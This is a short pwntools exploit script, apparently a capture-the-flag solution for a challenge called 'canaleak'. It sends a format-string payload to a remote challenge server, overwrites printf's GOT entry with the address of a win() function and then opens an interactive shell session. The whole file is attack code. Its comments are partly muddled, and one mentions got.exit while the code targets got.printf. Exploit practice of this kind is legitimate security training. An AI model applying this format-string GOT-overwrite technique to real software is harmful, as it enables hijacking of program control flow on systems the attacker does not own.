from pwn import *

elf = context.binary = ELF('./chall')
context.log_level = 'info'

#p = process()
p = remote("canaleak-pwn.wanictf.org",9006)

# converted to win funciton addr to integer form and passed it as arg
# followed by 'x' so that printf() understand it to print 4195879 time white
# char and print the addr that comes after this length of char which is win()
# and overwrite(%n fmt specifier used here) with function passed her got.exit

#payload = b'%4198973x%7$naaa' + pack(elf.got.printf) 

def got_ow():
    payload = {
                elf.got.printf: elf.sym.win
            }
    payload = fmtstr_payload(6,payload,write_size='short')
    #p.sendlineafter("me? : ",payload) 
    #p.sendline(payload)
    return payload 

payload = got_ow() 
p.recvuntil("me? : ")
p.sendline(payload)
p.interactive() 


